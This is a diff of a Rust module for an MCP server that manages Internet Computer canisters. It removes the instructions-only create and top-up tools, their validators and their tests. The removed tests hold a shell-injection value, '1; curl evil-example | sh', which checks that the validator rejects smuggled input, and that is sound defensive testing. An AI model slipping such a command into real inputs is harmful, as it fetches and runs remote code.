@@ -9,15 +9,14 @@
 //! canister (not `aaaaa-aa`), as the boundary node requires, and is signed by
 //! a controller (the management identity).
 //!
-//! **Creation and top-ups are instructions-only.** Creating or topping up a
-//! canister spends the user's ICP or cycles, so `icp_create_canister` and
-//! `icp_top_up_canister` deliberately execute nothing: each returns the icp
-//! CLI steps for the user to run themselves (see
-//! [`create_canister_instructions`] / [`top_up_instructions`]). The tools
-//! exist to reflect the platform capability; this server does not create
-//! canisters or move cycles or ICP. The creation steps include adding the
-//! management principal (printed by `icp_cycles_balance`) as a controller, so
-//! the lifecycle tools here can operate a canister the user created.
+//! **Creating and funding canisters is not part of this surface.** Those
+//! operations spend the user's ICP or cycles, so they are the user's to run
+//! with the icp CLI in their own terminal — this crate offers no tool for
+//! either, and `canister_update_call` refuses the ledger and cycles-minting
+//! methods that would complete one (see [`crate::compliance`]). Adding the
+//! management principal (printed by `icp_cycles_balance`) as a controller is
+//! part of those CLI steps, and is what lets the lifecycle tools here operate
+//! a canister the user created.
 //!
 //! Compiling Motoko/Rust to Wasm happens in the agent's own environment (guided
 //! by the IC skills); these tools take the already-built Wasm and put it on
@@ -35,8 +34,6 @@ use crate::identities::Identities;
 
 /// Cycles ledger — read for `icp_cycles_balance`.
 const CYCLES_LEDGER: &str = "um5iw-rqaaa-aaaaq-qaaba-cai";
-/// 1 ICP = 100_000_000 e8s.
-const E8S_PER_ICP: u64 = 100_000_000;
 /// Above this, install via the chunk store rather than a single ingress message
 /// (the ingress arg limit is ~2 MiB and must also hold the mode/id/arg).
 const MAX_SINGLE_SHOT_WASM: usize = 1_900_000;
@@ -47,37 +44,6 @@ const CHUNK_SIZE: usize = 1_000_000;
 // MCP-facing argument structs (textual in, textual out — the LLM never touches
 // binary Candid). One per tool; the `#[tool]` wrappers in main.rs pass these in.
 // ===========================================================================
-
-#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
-pub struct CreateCanisterArgs {
-    /// Intended cycle amount to fund the new canister with. OPTIONAL and
-    /// informational only: it is substituted into the printed CLI commands so
-    /// the user can copy-paste them; no cycles are moved by this tool.
-    #[serde(default)]
-    pub cycles: Option<u64>,
-    /// Intended ICP amount to convert into the new canister's cycles, as a
-    /// decimal string e.g. "0.5". OPTIONAL and informational only: substituted
-    /// into the printed CLI commands; no ICP is moved by this tool.
-    #[serde(default)]
-    pub icp: Option<String>,
-}
-
-#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
-pub struct TopUpArgs {
-    /// Canister to top up. Echoed into the returned CLI instructions; nothing is
-    /// executed against it.
-    pub canister_id: String,
-    /// Intended cycle amount. OPTIONAL and informational only: it is substituted
-    /// into the printed CLI commands so the user can copy-paste them; no cycles
-    /// are moved by this tool.
-    #[serde(default)]
-    pub cycles: Option<u64>,
-    /// Intended ICP amount to convert into cycles, as a decimal string. OPTIONAL
-    /// and informational only: substituted into the printed CLI commands; no ICP
-    /// is moved by this tool.
-    #[serde(default)]
-    pub icp: Option<String>,
-}
 
 #[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
 pub struct InstallCodeArgs {
@@ -120,7 +86,7 @@ pub struct UpdateSettingsArgs {
     /// Freezing threshold in seconds.
     #[serde(default)]
     pub freezing_threshold: Option<u64>,
-    /// Reserved-cycles limit.
+    /// Reserved-cycles limit, in cycles.
     #[serde(default)]
     pub reserved_cycles_limit: Option<u64>,
     /// Wasm heap memory limit in bytes.
@@ -151,26 +117,6 @@ pub struct CanisterActionOutput {
     pub message: String,
 }
 
-/// Structured result of `icp_top_up_canister` — CLI instructions, never an
-/// executed operation. The tool reflects a platform capability for
-/// completeness, but the server does not move cycles or ICP on the user's
-/// behalf; the user runs the printed commands themselves.
-#[derive(Debug, Serialize, schemars::JsonSchema)]
-pub struct TopUpInstructions {
-    /// The canister the instructions are for (canonical principal text).
-    pub canister_id: String,
-    /// Always `false`: this tool executes nothing and moves no funds.
-    pub executed: bool,
-    /// Step-by-step CLI instructions for the user to run the top-up themselves.
-    pub instructions: String,
-}
-
-impl TopUpInstructions {
-    pub fn human(&self) -> String {
-        self.instructions.clone()
-    }
-}
-
 /// Structured result of `icp_cycles_balance`.
 #[derive(Debug, Serialize, schemars::JsonSchema)]
 pub struct CyclesBalance {
@@ -186,26 +132,6 @@ impl CyclesBalance {
             "Your cycles-ledger balance (principal {}): {} cycles.",
             self.principal, self.balance
         )
-    }
-}
-
-/// Structured result of `icp_create_canister` — CLI instructions, never an
-/// executed operation. Like `icp_top_up_canister`, the tool reflects a
-/// platform capability for completeness, but the server does not create
-/// canisters or move cycles or ICP on the user's behalf; the user runs the
-/// printed commands themselves.
-#[derive(Debug, Serialize, schemars::JsonSchema)]
-pub struct CreateCanisterInstructions {
-    /// Always `false`: this tool executes nothing and moves no funds.
-    pub executed: bool,
-    /// Step-by-step CLI instructions for the user to create, fund, and (for
-    /// connector management) re-controller the canister themselves.
-    pub instructions: String,
-}
-
-impl CreateCanisterInstructions {
-    pub fn human(&self) -> String {
-        self.instructions.clone()
     }
 }
 
@@ -227,10 +153,7 @@ fn default_init_arg() -> String {
 pub async fn cycles_balance(ids: &Identities, session_id: &str) -> Result<CyclesBalance, String> {
     let (agent, principal) = management_agent(ids, session_id).await?;
     let ledger = parse_principal(CYCLES_LEDGER)?;
-    let account = Account {
-        owner: principal,
-        subaccount: None,
-    };
+    let account = Account { owner: principal, subaccount: None };
     let arg = Encode!(&account).map_err(|e| format!("encode account: {e}"))?;
     let reply = agent
         .query(&ledger, "icrc1_balance_of")
@@ -239,108 +162,7 @@ pub async fn cycles_balance(ids: &Identities, session_id: &str) -> Result<Cycles
         .await
         .map_err(|e| format!("icrc1_balance_of failed: {e}"))?;
     let balance = Decode!(&reply, Nat).map_err(|e| format!("decode balance: {e}"))?;
-    Ok(CyclesBalance {
-        principal: principal.to_text(),
-        balance: balance.to_string(),
-    })
-}
-
-/// Build the CLI instructions `icp_create_canister` returns. Deliberately
-/// executes nothing: no identity, no session, no canister call — creating and
-/// funding a canister spends the user's ICP or cycles, so the operation is the
-/// user's to run, in their own terminal, with a CLI and keys they control
-/// (exactly like [`top_up_instructions`]). The optional amounts are echoed
-/// into the printed commands after the same validation the old executing path
-/// used, so junk is rejected rather than printed.
-pub fn create_canister_instructions(
-    args: CreateCanisterArgs,
-) -> Result<CreateCanisterInstructions, String> {
-    let cycles = match args.cycles {
-        Some(0) => return Err("cycles amount must be greater than 0".into()),
-        Some(c) => c.to_string(),
-        None => "<CYCLES>".to_string(),
-    };
-    let icp = match args.icp.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
-        Some(s) => {
-            parse_icp_e8s_positive(s)?;
-            s.to_string()
-        }
-        None => "<ICP_AMOUNT>".to_string(),
-    };
-    let instructions = format!(
-        "No canister was created and no funds were moved: this server does not \
-         create or fund canisters on your behalf. This tool exists for \
-         completeness — creating canisters is an Internet Computer platform \
-         capability — but the operation itself is yours to run, from your own \
-         terminal, with the icp CLI:\n\
-         \n\
-         \x20 1. Get the icp CLI (if needed):       npm install -g @icp-sdk/icp-cli\n\
-         \x20    (Node.js >= 22; other installers: https://github.com/dfinity/icp-cli/releases)\n\
-         \x20 2. Check your cycles-ledger balance:  icp cycles balance -n ic\n\
-         \x20 3. (If needed) convert ICP to cycles: icp cycles mint --icp {icp} -n ic\n\
-         \x20 4. Create and fund the canister:      icp canister create <NAME> -e ic --cycles {cycles}\n\
-         \x20 5. (Optional) to let this connector manage the new canister\n\
-         \x20    (icp_install_code, status, lifecycle), add your management\n\
-         \x20    principal — printed by icp_cycles_balance — as a controller:\n\
-         \x20                                       icp canister settings update <NAME> --add-controller <PRINCIPAL> -e ic\n\
-         \n\
-         For the full creation & funding guide, load the official \
-         cycles-management skill (icp_get_skill with name \"cycles-management\")."
-    );
-    Ok(CreateCanisterInstructions {
-        executed: false,
-        instructions,
-    })
-}
-
-/// Build the CLI instructions `icp_top_up_canister` returns. Deliberately
-/// executes nothing: no identity, no session, no canister call. The tool
-/// reflects the platform capability (canisters are topped up with cycles) for
-/// completeness, but the operation itself is the user's to run, in their own
-/// terminal, with a CLI and keys they control.
-pub fn top_up_instructions(args: TopUpArgs) -> Result<TopUpInstructions, String> {
-    // Validate + canonicalize the id so the printed commands are copy-pastable.
-    let target = parse_principal(&args.canister_id)?;
-    // Substitute intended amounts into the commands where given; otherwise leave
-    // shell-style placeholders for the user to fill in. Given amounts go through
-    // the same validators the executing path used: the values are echoed into
-    // commands advertised as copy-pastable, so junk — a zero, a non-numeric
-    // string, anything smuggling shell input — is rejected, never printed. (A
-    // validated `icp` is digits with at most one dot, so it is inert in a shell.)
-    let cycles = match args.cycles {
-        Some(0) => return Err("cycles amount must be greater than 0".into()),
-        Some(c) => c.to_string(),
-        None => "<CYCLES>".to_string(),
-    };
-    let icp = match args.icp.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
-        Some(s) => {
-            parse_icp_e8s_positive(s)?;
-            s.to_string()
-        }
-        None => "<ICP_AMOUNT>".to_string(),
-    };
-    let instructions = format!(
-        "No top-up was performed and no funds were moved: this server does not \
-         execute top-ups on your behalf. This \
-         tool exists for completeness — topping up canisters is an Internet \
-         Computer platform capability — but the operation itself is yours to run, \
-         from your own terminal, with the icp CLI:\n\
-         \n\
-         \x20 1. Get the icp CLI (if needed):       npm install -g @icp-sdk/icp-cli\n\
-         \x20    (Node.js >= 22; other installers: https://github.com/dfinity/icp-cli/releases)\n\
-         \x20 2. Check your cycles-ledger balance:  icp cycles balance -n ic\n\
-         \x20 3. (If needed) convert ICP to cycles: icp cycles mint --icp {icp} -n ic\n\
-         \x20 4. Deposit cycles onto the canister:  icp canister top-up {target} --amount {cycles} -e ic\n\
-         \x20    (--amount accepts k/m/b/t suffixes, e.g. --amount 600b)\n\
-         \n\
-         For the full funding guide, load the official cycles-management skill \
-         (icp_get_skill with name \"cycles-management\")."
-    );
-    Ok(TopUpInstructions {
-        canister_id: target.to_text(),
-        executed: false,
-        instructions,
-    })
+    Ok(CyclesBalance { principal: principal.to_text(), balance: balance.to_string() })
 }
 
 /// Install (or reinstall/upgrade) a Wasm module on a canister you control.
@@ -369,11 +191,7 @@ pub async fn install_code(
         };
         let bytes = Encode!(&install).map_err(|e| format!("encode install_code: {e}"))?;
         mgmt_call(&agent, target, "install_code", bytes).await?;
-        Ok(format!(
-            "Installed {}-byte module on {target} (mode {}).",
-            wasm.len(),
-            args.mode
-        ))
+        Ok(format!("Installed {}-byte module on {target} (mode {}).", wasm.len(), args.mode))
     } else {
         let chunks = wasm.len().div_ceil(CHUNK_SIZE);
         install_chunked(&agent, target, mode, &wasm, init_arg).await?;
@@ -396,10 +214,8 @@ pub async fn canister_status(
     ids.require_write(session_id).await?;
     let target = parse_principal(&args.canister_id)?;
     let (agent, _) = management_agent(ids, session_id).await?;
-    let arg = Encode!(&CanisterIdRecord {
-        canister_id: target
-    })
-    .map_err(|e| format!("encode: {e}"))?;
+    let arg =
+        Encode!(&CanisterIdRecord { canister_id: target }).map_err(|e| format!("encode: {e}"))?;
     // canister_status is an UPDATE call (controller-gated), not a query.
     let bytes = mgmt_call(&agent, target, "canister_status", arg).await?;
     Ok(format_status(target, &bytes))
@@ -415,11 +231,8 @@ pub async fn update_canister_settings(
     let target = parse_principal(&args.canister_id)?;
     let mut settings = CanisterSettings::default();
     if let Some(cs) = &args.controllers {
-        settings.controllers = Some(
-            cs.iter()
-                .map(|c| parse_principal(c))
-                .collect::<Result<Vec<_>, _>>()?,
-        );
+        settings.controllers =
+            Some(cs.iter().map(|c| parse_principal(c)).collect::<Result<Vec<_>, _>>()?);
     }
     settings.compute_allocation = args.compute_allocation.map(Nat::from);
     settings.memory_allocation = args.memory_allocation.map(Nat::from);
@@ -442,29 +255,43 @@ pub async fn update_canister_settings(
 }
 
 /// Start a stopped canister.
-pub async fn start_canister(ids: &Identities, sid: &str, canister_id: &str) -> Result<String, String> {
+pub async fn start_canister(
+    ids: &Identities,
+    sid: &str,
+    canister_id: &str,
+) -> Result<String, String> {
     lifecycle(ids, sid, canister_id, "start_canister").await?;
     Ok(format!("Started {canister_id}."))
 }
 
 /// Stop a running canister (required before deletion).
-pub async fn stop_canister(ids: &Identities, sid: &str, canister_id: &str) -> Result<String, String> {
+pub async fn stop_canister(
+    ids: &Identities,
+    sid: &str,
+    canister_id: &str,
+) -> Result<String, String> {
     lifecycle(ids, sid, canister_id, "stop_canister").await?;
     Ok(format!("Stopped {canister_id}."))
 }
 
 /// Remove a canister's code and state, leaving it empty.
-pub async fn uninstall_code(ids: &Identities, sid: &str, canister_id: &str) -> Result<String, String> {
+pub async fn uninstall_code(
+    ids: &Identities,
+    sid: &str,
+    canister_id: &str,
+) -> Result<String, String> {
     lifecycle(ids, sid, canister_id, "uninstall_code").await?;
     Ok(format!("Uninstalled code from {canister_id}."))
 }
 
 /// Delete a stopped canister permanently (irreversible).
-pub async fn delete_canister(ids: &Identities, sid: &str, canister_id: &str) -> Result<String, String> {
+pub async fn delete_canister(
+    ids: &Identities,
+    sid: &str,
+    canister_id: &str,
+) -> Result<String, String> {
     lifecycle(ids, sid, canister_id, "delete_canister").await?;
-    Ok(format!(
-        "Deleted {canister_id}. (Its remaining cycles are burned; this is irreversible.)"
-    ))
+    Ok(format!("Deleted {canister_id}. (Its remaining cycles are burned; this is irreversible.)"))
 }
 
 // ===========================================================================
@@ -474,11 +301,13 @@ pub async fn delete_canister(ids: &Identities, sid: &str, canister_id: &str) -> 
 /// Build an ic-agent backed by the connection's stable management identity (the
 /// user's default account at this server's own origin), plus that identity's
 /// principal (the default controller/funder).
-async fn management_agent(ids: &Identities, session_id: &str) -> Result<(Agent, Principal), String> {
+async fn management_agent(
+    ids: &Identities,
+    session_id: &str,
+) -> Result<(Agent, Principal), String> {
     let identity = ids.management_identity(session_id).await?;
-    let principal = identity
-        .sender()
-        .map_err(|e| format!("could not derive your principal: {e}"))?;
+    let principal =
+        identity.sender().map_err(|e| format!("could not derive your principal: {e}"))?;
     // A clone of the injected base agent with the management identity swapped
     // in — same boundary-node routing as every other call.
     let agent = ids.agent_as(identity);
@@ -487,6 +316,16 @@ async fn management_agent(ids: &Identities, session_id: &str) -> Result<(Agent, 
 
 /// A management-canister (`aaaaa-aa`) update call with the effective canister id
 /// set to the TARGET — the boundary node requires this for lifecycle methods.
+///
+/// NOTE — these writes do NOT go through the service-discoverability gate that
+/// `canister_update_call` runs (see [`crate::discoverability`]). That is correct
+/// as things stand: these tools act on the USER'S OWN canisters as their
+/// management principal, not on a third party's app, and an app manifest has
+/// nothing to say about them. It is also currently moot — [`crate::IcProtocolTools`]
+/// is not part of the served composition. If that group is ever composed back
+/// in, revisit whether any of it can reach a canister the user does not control;
+/// the gate's premise is that a write to someone else's app needs that app's
+/// published consent.
 async fn mgmt_call(
     agent: &Agent,
     target: Principal,
@@ -512,10 +351,8 @@ async fn lifecycle(
     ids.require_write(session_id).await?;
     let target = parse_principal(canister_id)?;
     let (agent, _) = management_agent(ids, session_id).await?;
-    let arg = Encode!(&CanisterIdRecord {
-        canister_id: target
-    })
-    .map_err(|e| format!("encode: {e}"))?;
+    let arg =
+        Encode!(&CanisterIdRecord { canister_id: target }).map_err(|e| format!("encode: {e}"))?;
     mgmt_call(&agent, target, method, arg).await?;
     Ok(())
 }
@@ -529,19 +366,14 @@ async fn install_chunked(
     arg: Vec<u8>,
 ) -> Result<(), String> {
     // Start from a clean store so a previous partial upload can't leak in.
-    let clear = Encode!(&CanisterIdRecord {
-        canister_id: target
-    })
-    .map_err(|e| format!("encode clear_chunk_store: {e}"))?;
+    let clear = Encode!(&CanisterIdRecord { canister_id: target })
+        .map_err(|e| format!("encode clear_chunk_store: {e}"))?;
     mgmt_call(agent, target, "clear_chunk_store", clear).await?;
 
     let mut hashes: Vec<ChunkHash> = Vec::new();
     for chunk in wasm.chunks(CHUNK_SIZE) {
-        let up = Encode!(&UploadChunkArg {
-            canister_id: target,
-            chunk: chunk.to_vec(),
-        })
-        .map_err(|e| format!("encode upload_chunk: {e}"))?;
+        let up = Encode!(&UploadChunkArg { canister_id: target, chunk: chunk.to_vec() })
+            .map_err(|e| format!("encode upload_chunk: {e}"))?;
         let reply = mgmt_call(agent, target, "upload_chunk", up).await?;
         let h = Decode!(&reply, ChunkHash).map_err(|e| format!("decode chunk hash: {e}"))?;
         hashes.push(h);
@@ -561,50 +393,6 @@ async fn install_chunked(
     Ok(())
 }
 
-/// Parse a decimal-ICP string and require it to be > 0.
-fn parse_icp_e8s_positive(icp: &str) -> Result<u64, String> {
-    let e8s = parse_icp_to_e8s(icp)?;
-    if e8s == 0 {
-        return Err("ICP amount must be greater than 0".into());
-    }
-    Ok(e8s)
-}
-
-
-/// Parse a decimal-ICP string ("0.5", "2", ".25") into e8s, rejecting >8 decimals.
-fn parse_icp_to_e8s(s: &str) -> Result<u64, String> {
-    let s = s.trim();
-    let (int_part, frac_part) = match s.split_once('.') {
-        Some((i, f)) => (i, f),
-        None => (s, ""),
-    };
-    if int_part.is_empty() && frac_part.is_empty() {
-        return Err(format!("invalid ICP amount `{s}`"));
-    }
-    if frac_part.len() > 8 {
-        return Err("ICP amount has at most 8 decimal places".into());
-    }
-    let int_val: u64 = if int_part.is_empty() {
-        0
-    } else {
-        int_part
-            .parse()
-            .map_err(|_| format!("invalid ICP amount `{s}`"))?
-    };
-    let frac_val: u64 = if frac_part.is_empty() {
-        0
-    } else {
-        // Pad the fractional digits out to 8 places (e8s).
-        format!("{frac_part:0<8}")
-            .parse()
-            .map_err(|_| format!("invalid ICP amount `{s}`"))?
-    };
-    int_val
-        .checked_mul(E8S_PER_ICP)
-        .and_then(|v| v.checked_add(frac_val))
-        .ok_or_else(|| "ICP amount too large".into())
-}
-
 fn decode_wasm(args: &InstallCodeArgs) -> Result<Vec<u8>, String> {
     if let Some(b64) = args.wasm_base64.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
         return base64::engine::general_purpose::STANDARD
@@ -622,9 +410,7 @@ fn parse_mode(s: &str) -> Result<CanisterInstallMode, String> {
         "install" => Ok(CanisterInstallMode::Install),
         "reinstall" => Ok(CanisterInstallMode::Reinstall),
         "upgrade" => Ok(CanisterInstallMode::Upgrade(None)),
-        other => Err(format!(
-            "invalid install mode `{other}` (use install|reinstall|upgrade)"
-        )),
+        other => Err(format!("invalid install mode `{other}` (use install|reinstall|upgrade)")),
     }
 }
 
@@ -632,9 +418,7 @@ fn parse_log_visibility(s: &str) -> Result<LogVisibility, String> {
     match s.trim().to_lowercase().as_str() {
         "controllers" => Ok(LogVisibility::Controllers),
         "public" => Ok(LogVisibility::Public),
-        other => Err(format!(
-            "invalid log_visibility `{other}` (use controllers|public)"
-        )),
+        other => Err(format!("invalid log_visibility `{other}` (use controllers|public)")),
     }
 }
 
@@ -867,188 +651,6 @@ mod tests {
     use super::*;
 
     #[test]
-    fn parses_icp_decimal_strings() {
-        assert_eq!(parse_icp_to_e8s("1").unwrap(), 100_000_000);
-        assert_eq!(parse_icp_to_e8s("0.5").unwrap(), 50_000_000);
-        assert_eq!(parse_icp_to_e8s("2").unwrap(), 200_000_000);
-        assert_eq!(parse_icp_to_e8s("0.00000001").unwrap(), 1);
-        assert_eq!(parse_icp_to_e8s(".25").unwrap(), 25_000_000);
-        assert_eq!(parse_icp_to_e8s("0.05").unwrap(), 5_000_000);
-        assert_eq!(parse_icp_to_e8s("3.5").unwrap(), 350_000_000);
-    }
-
-    #[test]
-    fn rejects_bad_icp_amounts() {
-        assert!(parse_icp_to_e8s("0.000000001").is_err()); // 9 decimals
-        assert!(parse_icp_to_e8s("abc").is_err());
-        assert!(parse_icp_to_e8s("").is_err());
-        assert!(parse_icp_to_e8s("-1").is_err());
-    }
-
-    #[test]
-    fn icp_amount_validator_rejects_zero() {
-        assert!(parse_icp_e8s_positive("0").is_err()); // zero ICP rejected
-        assert_eq!(parse_icp_e8s_positive("0.5").unwrap(), 50_000_000);
-    }
-
-    // icp_create_canister is instructions-only, exactly like the top-up tool:
-    // nothing is executed, given amounts are validated then echoed into
-    // copy-pastable commands, and the steps include handing the connector's
-    // management principal control of the new canister so the lifecycle tools
-    // can operate it afterwards.
-    #[test]
-    fn create_instructions_execute_nothing_and_echo_amounts() {
-        let out = create_canister_instructions(CreateCanisterArgs {
-            cycles: Some(2_000_000_000_000),
-            icp: None,
-        })
-        .unwrap();
-        assert!(!out.executed, "the tool must never create a canister");
-        assert!(out.instructions.contains("No canister was created"), "{}", out.instructions);
-        assert!(
-            out.instructions
-                .contains("icp canister create <NAME> -e ic --cycles 2000000000000"),
-            "{}",
-            out.instructions
-        );
-        assert!(
-            out.instructions.contains("npm install -g @icp-sdk/icp-cli"),
-            "{}",
-            out.instructions
-        );
-        // The connector-management handover step: add the management principal
-        // (printed by icp_cycles_balance) as a controller.
-        assert!(out.instructions.contains("--add-controller"), "{}", out.instructions);
-        assert!(out.instructions.contains("icp_cycles_balance"), "{}", out.instructions);
-        // No ICP amount given: the conversion line keeps a fill-in placeholder.
-        assert!(out.instructions.contains("--icp <ICP_AMOUNT>"), "{}", out.instructions);
-    }
-
-    // The echoed amounts are advertised as copy-pastable, so junk is rejected
-    // (never printed), exactly as on the old executing path.
-    #[test]
-    fn create_instructions_validate_amounts() {
-        let zero = create_canister_instructions(CreateCanisterArgs {
-            cycles: Some(0),
-            icp: None,
-        })
-        .expect_err("zero cycles must be rejected");
-        assert!(zero.contains("greater than 0"), "{zero}");
-        let shell = create_canister_instructions(CreateCanisterArgs {
-            cycles: None,
-            icp: Some("1; curl evil-example | sh".into()),
-        })
-        .expect_err("shell-looking icp must be rejected");
-        assert!(shell.contains("invalid ICP amount"), "{shell}");
-        let out = create_canister_instructions(CreateCanisterArgs {
-            cycles: None,
-            icp: Some(" 0.5 ".into()),
-        })
-        .unwrap();
-        assert!(out.instructions.contains("icp cycles mint --icp 0.5 -n ic"), "{}", out.instructions);
-        assert!(
-            out.instructions.contains("--cycles <CYCLES>"),
-            "{}",
-            out.instructions
-        );
-    }
-
-    // icp_top_up_canister is instructions-only: the structured output must say
-    // nothing was executed, and the printed commands must be copy-pastable —
-    // canonical canister id, given amounts substituted, the rest left as
-    // placeholders.
-    #[test]
-    fn top_up_instructions_execute_nothing_and_echo_cycles() {
-        let out = top_up_instructions(TopUpArgs {
-            canister_id: "  ryjl3-tyaaa-aaaaa-aaaba-cai ".into(),
-            cycles: Some(600_000_000_000),
-            icp: None,
-        })
-        .unwrap();
-        assert!(!out.executed, "the tool must never execute a top-up");
-        assert_eq!(out.canister_id, "ryjl3-tyaaa-aaaaa-aaaba-cai", "id must be canonicalized");
-        assert!(out.instructions.contains("No top-up was performed"), "{}", out.instructions);
-        assert!(
-            out.instructions.contains(
-                "icp canister top-up ryjl3-tyaaa-aaaaa-aaaba-cai --amount 600000000000 -e ic"
-            ),
-            "{}",
-            out.instructions
-        );
-        // Where to get the CLI is part of the instructions: an npm one-liner
-        // inline, plus the releases page for the other installers.
-        assert!(
-            out.instructions.contains("npm install -g @icp-sdk/icp-cli"),
-            "{}",
-            out.instructions
-        );
-        assert!(
-            out.instructions.contains("https://github.com/dfinity/icp-cli/releases"),
-            "{}",
-            out.instructions
-        );
-        // No ICP amount given: the conversion lines keep a fill-in placeholder.
-        assert!(out.instructions.contains("--icp <ICP_AMOUNT>"), "{}", out.instructions);
-        assert!(out.instructions.contains("cycles-management"), "{}", out.instructions);
-    }
-
-    #[test]
-    fn top_up_instructions_echo_icp_and_leave_cycles_placeholder() {
-        let out = top_up_instructions(TopUpArgs {
-            canister_id: "aaaaa-aa".into(),
-            cycles: None,
-            icp: Some(" 0.5 ".into()),
-        })
-        .unwrap();
-        assert!(!out.executed);
-        assert!(out.instructions.contains("icp cycles mint --icp 0.5 -n ic"), "{}", out.instructions);
-        assert!(
-            out.instructions.contains("icp canister top-up aaaaa-aa --amount <CYCLES> -e ic"),
-            "{}",
-            out.instructions
-        );
-    }
-
-    // The echoed amounts are advertised as copy-pastable, so junk is rejected
-    // (never printed): a non-numeric `icp` — including a string smuggling shell
-    // input — and a zero `cycles` are errors, exactly as on the old executing
-    // path.
-    #[test]
-    fn top_up_instructions_validate_amounts() {
-        let shell = top_up_instructions(TopUpArgs {
-            canister_id: "aaaaa-aa".into(),
-            cycles: None,
-            icp: Some("1; curl evil-example | sh".into()),
-        })
-        .expect_err("shell-looking icp must be rejected");
-        assert!(shell.contains("invalid ICP amount"), "{shell}");
-        assert!(top_up_instructions(TopUpArgs {
-            canister_id: "aaaaa-aa".into(),
-            cycles: None,
-            icp: Some("abc".into()),
-        })
-        .is_err());
-        let zero = top_up_instructions(TopUpArgs {
-            canister_id: "aaaaa-aa".into(),
-            cycles: Some(0),
-            icp: None,
-        })
-        .expect_err("zero cycles must be rejected");
-        assert!(zero.contains("greater than 0"), "{zero}");
-    }
-
-    #[test]
-    fn top_up_instructions_reject_bad_canister_id() {
-        let err = top_up_instructions(TopUpArgs {
-            canister_id: "not-a-principal!".into(),
-            cycles: None,
-            icp: None,
-        })
-        .expect_err("an invalid canister id must be rejected");
-        assert!(err.contains("invalid principal"), "{err}");
-    }
-
-    #[test]
     fn parses_install_modes() {
         assert!(matches!(parse_mode("install").unwrap(), CanisterInstallMode::Install));
         assert!(matches!(parse_mode("REINSTALL").unwrap(), CanisterInstallMode::Reinstall));
@@ -1142,10 +744,7 @@ mod tests {
             reserved_cycles = 0 : nat; \
             query_stats = record { num_calls_total = 7 : nat } \
         })";
-        let bytes = candid_parser::parse_idl_args(textual)
-            .unwrap()
-            .to_bytes()
-            .unwrap();
+        let bytes = candid_parser::parse_idl_args(textual).unwrap().to_bytes().unwrap();
         let decoded = Decode!(&bytes, CanisterStatusResult).expect("subset decode");
         assert!(matches!(decoded.status, CanisterRunStatus::Running));
         assert_eq!(decoded.cycles, Nat::from(9_000_000_000_000u128));
